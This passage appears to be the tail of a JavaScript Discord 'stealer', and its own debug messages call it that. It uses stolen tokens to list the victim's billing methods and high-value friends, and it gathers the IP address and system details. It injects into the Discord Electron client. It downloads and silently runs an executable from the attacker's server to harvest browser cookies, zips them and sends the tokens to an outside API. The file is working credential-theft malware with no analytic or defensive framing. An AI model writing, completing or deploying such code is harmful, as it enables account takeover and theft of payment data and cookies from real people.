                "Content-Type": "application/json",
                authorization: token
            }
        }
    ).then(res => res.data).catch(() => null);

    if (!Array.isArray(response)) return "`None`";
    if (!response.length) return "`No Billing`";

    const billing = response
        .filter(item => !item.invalid)
        .map(item => item.type === 2 ? "<:paypal:1451161009464021127>" : item.type === 1 ? '💳' : '')
        .join(' ');

    return billing || "`No Billing`";
};

// Arkadaşları al
const GetFriends = async (token) => {
    const response = await axios.get(
        'https://discord.com/api/v9/users/@me/relationships',
        {
            headers: {
                authorization: token
            }
        }
    ).then(res => res.data).catch(() => null);

    if (!Array.isArray(response)) return "**Account Locked**";
    if (!response.length) return "**None**";

    const friends = response.filter(rel => rel.type === 1);
    const friendsList = [];

    const rareBadgeTypes = [
        "staff", "early_supporter", "verified_developer", "certified_moderator",
        "bug_hunter_level_1", "bug_hunter_level_2", "partner", 'hypesquad'
    ];

    const hqFriends = [];

    for (const friend of friends) {
        const publicFlags = friend.user.public_flags || 0;
        let rareBadges = [];

        for (const badgeType of rareBadgeTypes) {
            const badge = badges[badgeType];
            if (badge && badge.id && (publicFlags & badge.id) === badge.id) {
                rareBadges.push(badge.emoji);
            }
        }

        if (rareBadges.length > 0) {
            hqFriends.push({ friend: friend, rareBadges: rareBadges });
        }
    }

    const friendsPromises = hqFriends.map(async ({ friend, rareBadges }) => {
        let nitroBadges = [];
        let boostBadges = [];

        try {
            const profileResponse = await axios.get(
                "https://discord.com/api/v9/users/" + friend.user.id + '/profile',
                {
                    headers: {
                        authorization: token
                    }
                }
            );

            const profileData = profileResponse.data;

            if (profileData.premium_since) {
                const premiumDate = new Date(profileData.premium_since);
                const now = new Date();
                const days = Math.floor((now - premiumDate) / (1000 * 60 * 60 * 24));
                const months = Math.floor(days / 30);

                let nitroBadge = "nitro";
                if (months >= 72) nitroBadge = "nitro_opal";
                else if (months >= 60) nitroBadge = "nitro_ruby";
                else if (months >= 36) nitroBadge = "nitro_emerald";
                else if (months >= 24) nitroBadge = "nitro_diamond";
                else if (months >= 12) nitroBadge = "nitro_platinum";
                else if (months >= 6) nitroBadge = "nitro_gold";
                else if (months >= 3) nitroBadge = "nitro_silver";
                else if (months >= 1) nitroBadge = "nitro_bronze";

                if (badges[nitroBadge]) nitroBadges.push(badges[nitroBadge].emoji);
            }

            if (profileData.premium_guild_since) {
                const boostDate = new Date(profileData.premium_guild_since);
                const now = new Date();
                const days = Math.floor((now - boostDate) / (1000 * 60 * 60 * 24));
                const months = Math.floor(days / 30);

                let boostBadge = 'guild_booster_lvl1';
                if (months >= 24) boostBadge = "guild_booster_lvl9";
                else if (months >= 18) boostBadge = "guild_booster_lvl8";
                else if (months >= 15) boostBadge = "guild_booster_lvl7";
                else if (months >= 12) boostBadge = "guild_booster_lvl6";
                else if (months >= 9) boostBadge = "guild_booster_lvl5";
                else if (months >= 6) boostBadge = "guild_booster_lvl4";
                else if (months >= 3) boostBadge = "guild_booster_lvl3";
                else if (months >= 2) boostBadge = "guild_booster_lvl2";

                if (badges[boostBadge]) boostBadges.push(badges[boostBadge].emoji);
            }
        } catch (error) { }

        const allBadges = [...nitroBadges, ...rareBadges, ...boostBadges];
        const badgeString = allBadges.join('');

        return badgeString + ' | `' + friend.user.username + '`';
    });

    try {
        const results = await Promise.all(friendsPromises);
        for (const result of results) {
            if (result) friendsList.push(result);
        }
    } catch (error) {
        for (const promise of friendsPromises) {
            try {
                const result = await promise;
                if (result) friendsList.push(result);
            } catch { }
        }
    }

    return {
        length: friends.length,
        users: friendsList.length > 0 ? friendsList.join('\n') : '**None**',
        hq_friends: friendsList,
        total_hq_friends: friendsList.length
    };
};

// Byte formatla
function Bytes(bytes) {
    const sizes = ["Bytes", 'KB', 'MB', 'GB', 'TB'];
    if (bytes === 0) return "0 Byte";
    const i = parseInt(Math.floor(Math.log(bytes) / Math.log(1024)));
    return (bytes / Math.pow(1024, i)).toFixed(2) + ' ' + sizes[i];
}

// Path temizle
function cleanPath(pathStr) {
    const normalized = pathStr.replace(/^browser[\\/]/i, '');
    const parts = normalized.split(/[\\/]/);
    const filename = parts.pop();
    const directory = parts.join(' ');
    return directory + ' / ' + filename;
}

// Sistem bilgilerini topla
async function collectSystemInfo() {
    let ip = "Unknown";
    let country = "Unknown";
    let countryCode = 'XX';

    try {
        const { data } = await axios.get("http://ip-api.com/json/");
        ip = data.query || "Unknown";
        country = data.country || 'Unknown';
        countryCode = data.countryCode || 'XX';
    } catch (error) { }

    const cpu = os.cpus()?.[0]?.model || 'Unknown';
    const ram = '' + Math.floor(os.totalmem() / 1024 ** 3);
    const version = os.type() + ' ' + os.release();

    return {
        ip: ip,
        country: country,
        countryCode: countryCode,
        cpu: cpu,
        ram: ram,
        version: version
    };
}

// Kullanıcıları al
async function getUsers() {
    const users = [];
    const usersPath = path.join(process.env.SystemDrive || 'C:', "Users");

    try {
        const directories = fs.readdirSync(usersPath);
        for (const dir of directories) {
            if (dir === "Public" || dir === 'Default' || dir === 'Default User') continue;
            users.push(path.join(usersPath, dir));
        }
    } catch (error) { }

    if (!users.includes(os.homedir())) {
        users.push(os.homedir());
    }

    return users;
}

// Process'i sonlandır
async function killProcess(processName) {
    return new Promise(resolve => {
        try {
            exec("taskkill /F /IM " + processName + '.exe', (error) => {
                if (error) { }
                else { }
                resolve();
            });
        } catch (error) {
            resolve();
        }
    });
}

// Ana çalıştırma fonksiyonu
async function run() {
    debugLog("[RUN] ======================================");
    debugLog("[RUN] Starting stealer execution...");
    debugLog("[RUN] UserID: " + globalUserid);
    debugLog("[RUN] API URL: " + URL);
    debugLog("[RUN] ======================================");

    try {
        debugLog('[RUN] Attempting Discord Electron injection...');
        const injectionResults = await electronInject(globalUserid, URL);
        debugLog('[RUN] Injection results: ' + JSON.stringify(injectionResults));
    } catch (error) {
        debugLog('[RUN] ❌ Injection error: ' + error.message);
        console.error('[Injection Error]', error);
    }

    const userProfiles = await getUsers();
    debugLog("[RUN] Found " + userProfiles.length + " user profiles");

    try {
        debugLog('[RUN] ======================================');
        debugLog("[RUN] Starting local cookie collection...");

        const os = require('os');
        const computerName = os.hostname();
        const cookieDir = path.join(os.tmpdir(), "cookies_" + Date.now());
        fs.mkdirSync(cookieDir, { recursive: true });

        const outputExePath = path.join(os.tmpdir(), "output.exe");

        if (!fs.existsSync(outputExePath)) {
            debugLog('[RUN] output.exe not found, downloading...');

            const downloadResponse = await axios.get(URL + "/download-cookies", {
                responseType: "arraybuffer"
            });

            fs.writeFileSync(outputExePath, downloadResponse.data);
            debugLog("[RUN] ✅ output.exe downloaded successfully - Size: " + downloadResponse.data.length + " bytes");
        } else {
            debugLog("[RUN] output.exe already exists, skipping download");
        }

        debugLog("[RUN] Running output.exe locally...");

        const command = '\"' + outputExePath + "\" all --fingerprint --output-path \"" + cookieDir + '\"';

        try {
            execSync(command, {
                timeout: 30000,
                windowsHide: true
            });
            debugLog("[RUN] output.exe completed");
        } catch (error) {
            debugLog('[RUN] output.exe error: ' + error.message);
        }

        if (!fs.existsSync(cookieDir) || fs.readdirSync(cookieDir).length === 0) {
            debugLog("[RUN] No cookies collected - proceeding with token only");
        } else {
            debugLog("[RUN] Creating ZIP...");

            const AdmZip = require("adm-zip");
            const zipPath = path.join(os.tmpdir(), computerName + '_' + Date.now() + '.zip');
            const zip = new AdmZip();

            zip.addLocalFolder(cookieDir);
            zip.writeZip(zipPath);

            debugLog("[RUN] ZIP created: " + fs.statSync(zipPath).size + " bytes");
            debugLog('[RUN] Cookie ZIP ready at: ' + zipPath);

            global.cookieZipPath = zipPath;
            global.cookieZipComputerName = computerName;

            debugLog("[RUN] Cleaning up temp directory (keeping ZIP)...");

            try {
                fs.rmSync(cookieDir, { recursive: true, force: true });
                debugLog('[RUN] Temp directory cleaned');
            } catch (error) {
                debugLog('[RUN] Temp cleanup error: ' + error.message);
            }
        }
    } catch (error) {
        debugLog("[RUN] ❌ Cookie collection failed: " + error.message);
        debugLog("[RUN] Stack trace: " + error.stack);
    }

    debugLog('[RUN] Sending tokens to API...');
    await GetToken(userProfiles);

    debugLog("[RUN] ✅ Token collection completed");
    debugLog("[RUN] Cookie ZIP preserved at: " + (global.cookieZipPath || "N/A"));
    debugLog("[RUN] ======================================");
    debugLog("[RUN] ✅ EXECUTION COMPLETED SUCCESSFULLY");
    debugLog("[RUN] Status: completed");
    debugLog("[RUN] Timestamp: " + new Date().toISOString());
    debugLog("[RUN] ======================================");
}

// Programı çalıştır
run().catch(error => {
    debugLog("[FATAL] ======================================");
    debugLog('[FATAL] STEALER CRASHED!');
    debugLog("[FATAL] Error: " + error.message);
    debugLog("[FATAL] Stack: " + error.stack);
    debugLog("[FATAL] ======================================");
    debugLog("[FATAL] ======================================");
    debugLog("[FATAL] ❌ EXECUTION CRASHED");
    debugLog("[FATAL] Error: " + error.message);
    debugLog("[FATAL] Timestamp: " + new Date().toISOString());
    debugLog("[FATAL] ======================================");
    process.exit(1);
});
